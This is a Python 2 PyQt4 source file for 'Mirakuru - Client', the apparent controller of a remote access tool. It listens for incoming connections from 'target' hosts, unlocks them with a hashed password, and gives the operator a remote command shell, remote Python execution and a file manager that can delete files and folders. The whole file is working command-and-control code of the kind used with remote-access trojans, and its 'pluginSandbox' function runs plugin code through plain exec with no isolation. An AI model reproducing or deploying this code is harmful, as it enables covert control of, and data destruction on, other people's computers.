# -*- coding: utf-8 -*- 

from threading import Thread
import sys
import socket
import time
import ast
import datetime
import inspect
import hashlib
import os
from xml.dom import minidom

from PyQt4.QtGui import *
from PyQt4.QtCore import *

from libs import linesnum, gui, style, credits, console

def pluginSandbox(script, data):
    src = str(script)
    try:
        exec src
    except Exception as errormsg:
        msgbox = QMessageBox()
        msgbox.setStyleSheet(style.msgboxStyle)
        msgbox.setWindowTitle('Local Script Error')
        msgbox.setText(errormsg)
        msgbox.setIcon(QMessageBox.Critical)
        msgbox.addButton(QPushButton('OK'), QMessageBox.RejectRole)
        msgbox.exec_()

class MainDialog(QWidget, gui.Ui_Form):
    # noinspection PyUnresolvedReferences
    def __init__(self, parent=None):
        super(MainDialog, self).__init__(parent)
        self.setupUi(self)

        self.statusok('Initializing Py IDLE', self.lineno())
        # init idles with lines
        self.rlines = linesnum.LineTextWidget()
        self.LeditorLayout.addWidget(self.rlines)
        self.llines = linesnum.LineTextWidget()
        self.ReditorLayout.addWidget(self.llines)
        self.console = console.Console()
        self.shellLayout.addWidget(self.console)


        self.statusok('Initializing tray', self.lineno())
        # init tray
        icon = QIcon('assets/icon.png')
        self.trayIcon = SystemTrayIcon(icon)
        self.trayIcon.show()

        self.statusok('Initializing variables', self.lineno())
        # Initializing variables
        self.acceptthreadState = False
        self.active = False
        self.nextcmd = ''
        self.sockind = 0
        self.server = '0.0.0.0'
        self.port = 0
        self.timeout = 5
        self.gui = QApplication.processEvents
        self.displayText(msg=credits.credit)

        # Plugins Variables
        self.plugins_all = {}
        self.plugins_dir = os.path.join(os.getcwd(), 'plugins')
        # Init Plugins List
        self.pluginsInit()
        # Plugins SIGNALS
        self.connect(self.pluginsSearchEdit, SIGNAL('textChanged(QString)'), self.pluginsUpdate)
        self.pluginsList.itemDoubleClicked.connect(self.pluginAdd)
        self.executeButton.clicked.connect(self.pluginRun)

        self.statusok('Initializing signals', self.lineno())
        # Initializing signals
        self.socketsList.itemDoubleClicked.connect(self.connectSocket)
        self.runserverButton.clicked.connect(self.scannerStart)
        self.stopserverButton.clicked.connect(self.scannerStop)
        self.refreshexplorerButton.clicked.connect(self.explorerGetlist)
        self.explorerTable.doubleClicked.connect(self.openFolder)
        self.upexplorerButton.clicked.connect(self.parentFolder)
        self.mkdirexplorerButton.clicked.connect(self.createFolder)
        self.mkfileexplorerButton.clicked.connect(self.createFile)
        self.removeexplorerButton.clicked.connect(self.deleteContent)
        self.explorerPathEntry.returnPressed.connect(self.openPath)
        self.connect(self, SIGNAL('triggered()'), self.closeEvent)

        self.connect(self.tabWidget, SIGNAL('currentChanged(int)'), self.tabDetector)
        self.connect(self.console, SIGNAL("returnPressed"), self.runCommand)

        # Initializing combobox change Event
        self.connect(self.explorerDrivesDrop, SIGNAL('currentIndexChanged(int)'), self.driveChange)

        #self.explorerTable.setContextMenuPolicy(self.contextMenuEvent)

        self.statusok('Set placeholder text for command line', self.lineno())
        # Set placeholder text for command line
        #self.commandLine.setPlaceholderText('type command here...')

        self.statusok('Initializing explorers custom menu', self.lineno())
        # Initializing explorer right click menu
        self.explorerTable.setContextMenuPolicy(Qt.CustomContextMenu)
        self.connect(self.explorerTable, SIGNAL('customContextMenuRequested(const QPoint&)'), self.explorerMenu)
        self.socketsList.setContextMenuPolicy(Qt.CustomContextMenu)
        self.connect(self.socketsList, SIGNAL('customContextMenuRequested(const QPoint&)'), self.serversMenu)

        # Finish initializing
        self.statusok('Initialized', self.lineno())

        self.tabWidget.setEnabled(False)

    # Detect tabs switch
    def tabDetector(self):

        # Check if switched to explorers tab
        if self.tabWidget.currentIndex() == 2:
            self.explorerGetlist()

    # END: TabWidget functions

    # START: Plugins Functions
    # Plugins Update
    def pluginsInit(self):
        if os.path.exists(self.plugins_dir):
            for dir in os.listdir(self.plugins_dir):
                plugin = os.path.join(self.plugins_dir, dir)
                plugins_files = os.listdir(plugin)
                if 'settings.xml' in plugins_files and 'RS.py' in plugins_files and 'LS.py' in plugins_files:
                    xml = minidom.parse(os.path.join(plugin, 'settings.xml'))
                    name = xml.getElementsByTagName('name')[0].firstChild.nodeValue
                    self.plugins_all[name] = plugin
        self.pluginsUpdate()


    def pluginsUpdate(self):
        self.pluginsList.clear()
        filter_query = self.pluginsSearchEdit.text()
        for plugin_name, plugin_path in self.plugins_all.iteritems():
            if str(filter_query).lower() in plugin_name.lower():
                item = QListWidgetItem(plugin_name)
                self.pluginsList.addItem(item)


    def pluginAdd(self):
        plugin_name = str(self.pluginsList.currentItem().text())
        rscript_file = os.path.join(self.plugins_all[plugin_name], 'RS.py')
        lscript_file = os.path.join(self.plugins_all[plugin_name], 'LS.py')
        try:
            with open(rscript_file, 'r') as rs:
                rscript = rs.read()
            with open(lscript_file, 'r') as ls:
                lscript = ls.read()
            self.rlines.setText(rscript)
            self.llines.setText(lscript)
        except:
            self.msg('ERROR', 'Plugin is damaged')

    def pluginRun(self):

        self.statusok('Send script to remote host', self.lineno())
        # Send script to remote host for execute
        self.Send('runscript ' + str(self.rlines.getTextEdit()))

        self.statusok('Recieve executed scripts output', self.lineno())
        # Recieve executed scripts output
        dataf = self.Receive()
        # Run Sandbox
        self.pluginSandbox(self.llines.getTextEdit(), dataf.split('\n\n')[-1])

        self.statusok('Update output', self.lineno())
        # Update output console
        #self.outputConsole.setHtml(data.split('</p>')[-1])

    def pluginSandbox(self, script, data):
        pluginSandbox(script, data)

    # END: Plugins Functions
    
    # START: socket functions
    # listen for clients
    def scannerStart(self):
        if not self.runserverButton.isChecked():
            self.statusok('Set listen button to checked', self.lineno())
            # set listen button to checked
            self.runserverButton.setChecked(True)
        else:
            self.statusok('Get IP address from line entry', self.lineno())
            # get IP address from line editor
            self.server = self.ipaddressLine.text()
            self.statusok('Get port number from line entry', self.lineno())
            # get port number from line entry
            self.port = int(self.portLine.text())
            self.runserverButton.setChecked(True)
            self.stopserverButton.setChecked(False)
            self.statusok('Start scan sockets', self.lineno())
            self.scanSockets(self.port)


    # stop listening for clients
    def scannerStop(self):

        # Buttons
        if not self.stopserverButton.isChecked():
            self.stopserverButton.setChecked(True)
            self.tabWidget.setEnabled(False)
            self.tabWidget.setCurrentIndex(0)
        else:

            # Close all connection and terminate socket
            self.acceptthreadState = False

            # Make Last connection for terminate thread
            try:
                self.shd = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.shd.connect(('127.0.0.1', self.port))
                self.shd.close()
            except:
                pass
            if self.active:
                self.active = False
                self.c.close()

            # GUI Transformation
            self.clientscountLabel.setText('0')
            self.runserverButton.setChecked(False)
            self.stopserverButton.setChecked(True)
            self.socketsList.clear()
            self.displayText(msg=credits.credit)
            self.setWindowTitle('Mirakuru - Client')
            #self.stopServer()
            self.tabWidget.setEnabled(False)
            self.tabWidget.setCurrentIndex(0)


    # make new variables, clear all text
    # listen for clients in new thread
    def scanSockets(self, port):
        self.statusok('Initializing variables', self.lineno())
        # Initializing variables
        self.socks = []
        self.sockItems = []
        self.unlockedSocks = []
        self.counter = 0
        self.socketsList.clear()
        #self.commandLine.setText('')
        self.acceptthreadState = True
        self.statusok('Initializing new thread for listen connections', self.lineno())
        # Initializing new thread for listen connections
        self.listenthread = Thread(target=self.listenConnections, args=(port,))
        self.listenthread.setDaemon(True)
        self.listenthread.start()


    # listen for clients
    # accept connections
    # add to socketlist widget
    def listenConnections(self, port):

        # Initializing socket
        self.c = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # telling the OS that you know what you're doing and you still want to bind to the same port
        self.c.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

        # Bind address
        self.c.bind((self.server, int(port)))

        # Start listen for connections
        self.c.listen(128)
        while self.acceptthreadState == True:
            try:

                # Try accept connection
                self.s, self.a = self.c.accept()
            except:

                continue

            if self.acceptthreadState == False:
                return
            if self.s:

                # Set timeout None
                self.s.settimeout(self.timeout)

                # Save connected socket
                self.socks += [self.s]

                # Save connected address
                self.sockItems += [self.a]

                self.trayIcon.showMessage('New Connection', 'From {}'.format(self.a[0]), self.lineno())

                # Add connection to servers list
                self.socketListUpdate()


    def socketListUpdate(self):
        self.socketsList.clear()
        for __sock__ in self.sockItems:
            row = QListWidgetItem(' %s ' % __sock__[0])
            if __sock__ in self.unlockedSocks:
                row.setIcon(QIcon(r'assets/unlocked.png'))
            else:
                row.setIcon(QIcon(r'assets/tick.png'))
            self.socketsList.addItem(row)
            self.clientscountLabel.setText(str(self.socketsList.count()))

    # connect to client
    def connectSocket(self):

        # Update server index
        try:
            self.sockind = self.socketsList.currentRow()
        except:
            return

        self.active = True

        # Ask Password
        while 1:
            if self.sockItems[self.sockind] not in self.unlockedSocks:
                dlg = QInputDialog(self)
                dlg.setInputMode(QInputDialog.TextInput)
                dlg.setWindowTitle('Password Protection')
                dlg.setLabelText('Enter Password: ')
                dlg.setOkButtonText('Login')
                dlg.setStyleSheet(style.popupDialog)
                ok = dlg.exec_()

                if str(dlg.textValue()) != '':
                    _hash = hashlib.md5()
                    _hash.update(str(dlg.textValue()))
                    self.Send(_hash.hexdigest())
                else:
                    break

            else:
                self.Send('areyouactive')

            try:
                self.data = self.Receive()

                if self.data != '':
                    if self.data == 'Access Denied':
                        self.displayText(msg='<br><br><p align="center">'
                                             '<table style="border-color: #CC2E2E; border-style: solid;" border="1" width="300" cellpadding="5">'
                                             '<tr><td><font size=42 color=#CC2E2E><p align="center">'
                                             'ACCESS DENIED'
                                             '</p></font></td></tr></table></p>')
                        continue
                    else:
                        self.active = True
                        self.console.showMessage(message='')
                        self.setWindowTitle('Mirakuru - Client - Connected to %s' % str(self.sockItems[self.sockind]))
                        self.tabWidget.setEnabled(True)
                        self.unlockedSocks.append(self.sockItems[self.sockind])
                        self.socketListUpdate()
                        break
            except socket.error:
                self.statusno('Error while recieve message from target', self.lineno())
                self.statusok('Close connection', self.lineno())
                # Error while recieve message from target
                self.socks[self.sockind].close()
                time.sleep(0.8)
                self.active = False
                break
            break

    def terminateSock(self):
        self.Send('terminate')
        data = self.Receive()
        if data == 'quitted':
            self.socks[self.sockind].close()
            self.displayText(msg='<br><br><p align="center"><font size=42 color=#CC2E2E>%s<br>Connection Lost</font></p>' % self.sockItems[self.sockind][0])
            del self.socks[self.sockind]
            del self.sockItems[self.sockind]
            self.socketListUpdate()
            self.tabWidget.setEnabled(False)
            self.tabWidget.setCurrentIndex(0)

    # while close program, connect himself for shutdown socket
    def closeEvent(self, event):
        if self.acceptthreadState:
            self.acceptthreadState = False
            self.KeyLoggingState = False

            self.statusok('Initializing shutdown signal socket', self.lineno())
            # Initializing shutdown signal socket
            self.shd = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

            self.statusok('Send shutdown signal to quit thread', self.lineno())
            # Send shutdown signal to quit thread
            self.shd.connect(('127.0.0.1', self.port))

            self.statusok('Quit application', self.lineno())
            # App Exit
            QApplication.exit()
        else:
            try:
                self.shd = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.shd.connect(('127.0.0.1', self.port))
            except Exception, e:
                print e
            QApplication.exit()

    # send socket    
    def Send(self, cmd, end="[ENDOFMESSAGE]"):
        try:
            self.statusok('Send bytes', self.lineno())
            # Send bytes
            self.socks[self.sockind].sendall((cmd + end).encode('utf-8'))
        except socket.error:
            self.statusno('Error', 'An existing connection was forcibly closed by the remote host')


    # recieve socket
    def Receive(self, end="[ENDOFMESSAGE]"):
        data = ""

        self.statusok('Recieve bytes', self.lineno())
        # Recieve bytes
        try:
            l = self.socks[self.sockind].recv(1024)
            while l:
                time.sleep(0.1)
                data += l
                if data.endswith(end):
                    break
                else:
                    self.gui()
                    l = self.socks[self.sockind].recv(1024)
        except socket.timeout:
            self.tabWidget.setEnabled(False)
            self.tabWidget.setCurrentIndex(0)
            self.displayText()
            self.statusno('Connection lost with ' + self.sockItems[self.sockind][0], self.lineno())
            return 'ConnectionError'
        return data[:-len(end)].decode('utf-8')
            
    # END: socket functions

    # START: explorer functions
    # get list of content from remote folder
    def explorerGetlist(self):

        def sizeof_fmt(num, suffix='B'):
            for unit in ['','K','M','G','T','P','E','Z']:
                if abs(num) < 1024.0:
                    return "%3.1f%s%s" % (num, unit, suffix)
                num /= 1024.0
            return "%.1f%s%s" % (num, 'Yi', suffix)

        # Turn combo signal off
        self.comboInEditMode = True

        # Clear Combobox
        self.explorerDrivesDrop.clear()

        # Get logical disk drives captions
        self.Send('wmic logicaldisk get caption')
        self.data = self.Receive()

        # Set captions in combobox
        for i in self.data.split('Caption')[-1].split('\n'):
            if ':' in i:
                self.explorerDrivesDrop.addItem(i.replace(' ', '').replace('\r', ''))

        # Set path
        self.explorerPathEntry.setText(self.data.split('\n')[0][self.data.find('>')+1:].replace('</p>', ''))

        # Get active drive caption
        self.explorerDrivesDrop.setCurrentIndex(self.explorerDrivesDrop.findText(self.data.split('</p>')[0].split('>')[-1].split('\\')[0], Qt.MatchFixedString))

        # Turn combo signal on
        self.comboInEditMode = False

        # Initializing table
        self.explorerTable.clearContents()
        self.explorerTable.sortItems(0)

        self.statusok('Send command to remote host', self.lineno())
        # Send command for recieve contents list
        self.Send('ls')

        self.statusok('Recieve contents list', self.lineno())
        # Recieve contents list
        self.data = self.Receive()

        self.statusok('Set contets list in table', self.lineno())
        # Show list
        dic = ast.literal_eval(self.data.split('\n\n')[1])
        self.explorerTable.setRowCount(len(dic))
        for n, i in enumerate(dic):
            try:
                ext = dic[i]['name'].split('.')[-1]
            except Exception, e:
                self.statusno('Error while parsing directory', self.lineno())
                ext = ''

            if dic[i]['hidden']:
                fileColor = QColor(235, 235, 235)
                folderColor = QColor(201, 101, 101)
            else:
                fileColor = QColor(155, 89, 182)
                folderColor = QColor(0, 255, 255)

            # set content type
            item = QTableWidgetItem('File') if dic[i]['type'] else QTableWidgetItem('Folder')
            if dic[i]['type']:
                item.setTextColor(fileColor)
                item.setIcon(QIcon(QPixmap(r'assets\file.png')))
                item.setSizeHint(QSize(100, 30))
            else:
                item.setTextColor(folderColor)
                item.setIcon(QIcon(QPixmap(r'assets\folder.png')))
                item.setSizeHint(QSize(100, 30))
            self.explorerTable.setItem(n, 0, item)

            # set content name
            item = QTableWidgetItem(dic[i]['name'])
            if dic[i]['type']:
                item.setTextColor(fileColor)
            else:
                item.setTextColor(folderColor)
            self.explorerTable.setItem(n, 1, item)

            # set content modified date
            item = QTableWidgetItem(dic[i]['modified'])
            item.setTextAlignment(Qt.AlignCenter)
            item.setSizeHint(QSize(220, 30))
            self.explorerTable.setItem(n, 2, item)

            # set file size
            item = QTableWidgetItem(sizeof_fmt(dic[i]['size'])) if dic[i]['type'] else QTableWidgetItem('')
            item.setTextAlignment(Qt.AlignRight | Qt.AlignVCenter)
            item.setTextColor(fileColor)
            self.explorerTable.setItem(n, 3, item)

        # update table
        self.explorerTable.resizeColumnsToContents()
        self.explorerTable.horizontalHeaderItem(3).setTextAlignment(Qt.AlignCenter)

        # count files & directories
        self.explorerContentLabel.setText('Directories: %s Files: %s' % (str(len([i for i in dic if dic[i]['type'] is False])), str(len([i for i in dic if dic[i]['type'] is True]))))

    # Change Drive
    def driveChange(self):
        if not self.comboInEditMode:
            self.Send('cd ' + str(self.explorerDrivesDrop.itemText(self.explorerDrivesDrop.currentIndex())))
            try:
                if 'Error opening directory' in self.Receive():
                    warn = QMessageBox(QMessageBox.Warning, 'Error', 'Error Opening Directory', QMessageBox.Ok)
                    warn.setStyleSheet(style.msgboxStyle)
                    warn.exec_()
            except:
                pass
            self.explorerGetlist()

    # open remote folder from path entry
    def openPath(self):
        self.Send('cd %s' % self.explorerPathEntry.text())
        if 'Error opening directory' in self.Receive():
            warn = QMessageBox(QMessageBox.Warning, 'Error', 'Error Opening Directory', QMessageBox.Ok)
            warn.setStyleSheet(style.msgboxStyle)
            warn.exec_()

        self.explorerGetlist()

    # open remote folder
    def openFolder(self):

        self.statusok('Get folder name', self.lineno())
        # Get folder name
        type = self.explorerTable.item(self.explorerTable.currentItem().row(), 0).text()
        name = self.explorerTable.item(self.explorerTable.currentItem().row(), 1).text()

        if 'Folder' in type:

            self.statusok('Choose new folder', self.lineno())
            # Choose new folder
            self.Send('cd %s' % name)

            self.statusok('Recieve new folders contents list', self.lineno())
            # Recieve new folders contents list
            self.Receive()

            self.statusok('Update table', self.lineno())
            # Update table
            self.explorerGetlist()

    # open parent folder
    def parentFolder(self):

        self.statusok('Choose parent folder', self.lineno())
        # Choose parent folder
        self.Send('cd ..')

        self.statusok('Get new folders contents list', self.lineno())
        # Get new folders contents list
        self.Receive()

        self.statusok('Update table', self.lineno())
        # Update table
        self.explorerGetlist()

    # create folder
    def createFolder(self):
        dlg = QInputDialog(self)
        dlg.setInputMode(QInputDialog.TextInput)
        dlg.setWindowTitle('New Folder Name')
        dlg.setLabelText('Enter Name: ')
        dlg.setOkButtonText('Create')
        dlg.setCancelButtonText('Cancel')
        dlg.setStyleSheet(style.popupDialog)
        ok = dlg.exec_()
        self.Send('mkdir %s' % dlg.textValue())
        self.Receive()
        self.explorerGetlist()

    def createFile(self):
        dlg = QInputDialog(self)
        dlg.setInputMode(QInputDialog.TextInput)
        dlg.setWindowTitle('New File Name')
        dlg.setLabelText('Enter Name: ')
        dlg.setOkButtonText('Create')
        dlg.setCancelButtonText('Cancel')
        dlg.setStyleSheet(style.popupDialog)
        ok = dlg.exec_()
        self.Send('type NUL > %s' % dlg.textValue())
        self.Receive()
        self.explorerGetlist()

    def deleteContent(self):
        try:
            warn = QMessageBox(QMessageBox.Warning, 'Confirm', 'Are you sure to delete?')
            warn.setStandardButtons(QMessageBox.Yes | QMessageBox.No)
            warn.setStyleSheet(style.msgboxStyle)
            ans = warn.exec_()
            if ans == QMessageBox.Yes:
                if self.explorerTable.item(self.explorerTable.currentItem().row(), 2).text() == 'File':
                    self.Send('del /Q %s' % self.explorerTable.item(self.explorerTable.currentItem().row(), 4).text())
                else:
                    self.Send('rmdir /S /Q %s' % self.explorerTable.item(self.explorerTable.currentItem().row(), 4).text())
                if self.Receive() == 'ConnectionError':
                    return
            else:
                return
        except Exception as e:
            print e
            return
        self.explorerGetlist()

    def explorerMenu(self, point):
        self.eMenu = QMenu(self)

        try:
            if self.explorerTable.item(self.explorerTable.currentItem().row(), 0).text() == 'Folder':
                self.eMenu.addAction(QIcon('assets\\folder.png'), 'Open folder', self.openFolder)
                self.eMenu.addSeparator()
        except:
            pass

        self.eMenu.addAction(QIcon('assets\\new_file.png'), 'New File', self.createFile)
        self.eMenu.addAction(QIcon('assets\\new_folder.png'), 'New Folder', self.createFolder)

        self.eMenu.addSeparator()

        self.eMenu.addAction(QIcon('assets\\refresh.png'), 'Refresh', self.explorerGetlist)

        self.eMenu.addSeparator()

        try:
            self.explorerTable.item(self.explorerTable.currentItem().row(), 2).text()
            self.eMenu.addAction(QIcon('assets\\remove.png'), 'Delete', self.deleteContent)
        except:
            self.eMenu.addAction(QIcon('assets\\remove.png'), 'Delete', self.deleteContent).setDisabled(True)

        # Show explorers right click menu
        self.eMenu.exec_(self.explorerTable.mapToGlobal(point))
        
    # END: explorer functions

    
    # START: shell functions
    # display console text
    def displayText(self, msg='', header='', error=''):
        self.console.setHtml('''
        <p align="center" style="color: #ffffff; background-color: #CC2E2E">%s</p>
        <p align="center" style="color: #2ecc71; background-color: #194759">%s</p>
        <p align="center" style="color: #ffffff;">%s</p>
        ''' % (error, header, msg.replace('\n', '<br>').replace('\t', '   ')))

    # run shell command
    def runCommand(self):
        if self.active:
            try:

                command = self.console.command
                self.Send(command)
                data = self.Receive().split('>')[-1]
                while data.startswith('\n'):
                    data = data[1:]
                data = data.replace('\n', '<br>')

                self.console.append('<font color=#3CFFFF>'+data+'</font>')
                self.console.newPrompt()

            except socket.error:

                self.statusno('Error with connection', self.lineno())
                # Error with connection
                self.socks[self.sockind].close()

                time.sleep(0.8)
                self.active = False

    
    # END: shell functions

    # START: servers managment functions
    # servers right click menu
    def serversMenu(self, point):
        self.sMenu = QMenu(self)

        self.sMenu.addAction(QIcon('assets\\connect.png'), 'Connect', self.connectSocket)
        self.sMenu.addSeparator()
        self.sMenu.addAction(QIcon('assets\\terminal.png'), 'Remote CMD', self.remoteCMD)
        self.sMenu.addAction(QIcon('assets\\python.png'), 'Remote Python', self.remotePython)
        self.sMenu.addAction(QIcon('assets\\file_manager.png'), 'Remote File Manager', self.remoteExplorer)
        self.sMenu.addSeparator()
        self.sMenu.addAction(QIcon('assets\\stop.png'), 'Terminate', self.terminateSock)


        # Check if server selected
        # Show servers right click menu
        try:
            self.socketsList.currentItem().text()
            self.sMenu.exec_(self.socketsList.mapToGlobal(point))
        except AttributeError:
            pass

    # Switch to CMD tab
    def remoteCMD(self):
        self.tabWidget.setCurrentIndex(0)

    # Switch to Python tab
    def remotePython(self):
        self.tabWidget.setCurrentIndex(1)

    # Switch to File Manager tab
    def remoteExplorer(self):
        self.tabWidget.setCurrentIndex(2)
    
    # START: messages functions
    # popup message
    def msg(self, title='', text=''):
        msgbox = QMessageBox()
        msgbox.setStyleSheet(style.msgboxStyle)
        msgbox.setWindowTitle(title)
        msgbox.setText(text)
        msgbox.setIcon(QMessageBox.Critical)
        msgbox.addButton(QPushButton('OK'), QMessageBox.RejectRole)
        tr = msgbox.exec_()

    # returns the current line number in our program
    def lineno(self):
        return inspect.currentframe().f_back.f_lineno

    # display status with success message
    def statusok(self, msg, line):
        self.statusConsoleText.moveCursor(QTextCursor.End)
        self.statusConsoleText.insertHtml(
            '<br>[+] (%s) [CODE:%s] - <font color=#f07e01>%s</font>' % (
                datetime.datetime.now(), line, msg))

    # display status with error message
    def statusno(self, msg, line):
        self.statusConsoleText.moveCursor(QTextCursor.End)
        self.statusConsoleText.append(
            '<br><font color="red">[-]</font> (%s) <font color="red">[CODE:%s]</font> - <font color=#f07e01>%s</font>' % (
                datetime.datetime.now(), line, msg))
        
    # END: messages function


# tray icon
class SystemTrayIcon(QSystemTrayIcon, MainDialog):
    def __init__(self, icon, parent=None):
        # super(SystemTrayIcon, self).__init__(None)
        QSystemTrayIcon.__init__(self, icon, parent)
        self.menu = QMenu(parent)
        self.trExit = self.menu.addAction('Exit')
        self.setContextMenu(self.menu)

        self.trExit.triggered.connect(self._exit)

    def welcome(self):
        self.showMessage('Welcome', 'Mirakuru\n1.0', QSystemTrayIcon.Information)

    def show(self):
        QSystemTrayIcon.show(self)
        QTimer.singleShot(100, self.welcome)

    def _exit(self):
        QApplication.exit()


def main():
    app = QApplication(sys.argv)
    # Initializing splashscreen
    splash_pix = QPixmap('assets/splash.png')
    splash = QSplashScreen(splash_pix, Qt.WindowStaysOnTopHint)
    splash.setMask(splash_pix.mask())
    splash.show()
    time.sleep(3)
    # app.processEvents()
    form = MainDialog()
    form.show()
    splash.finish(form)
    sys.exit(app.exec_())


if __name__ == '__main__':
    main()
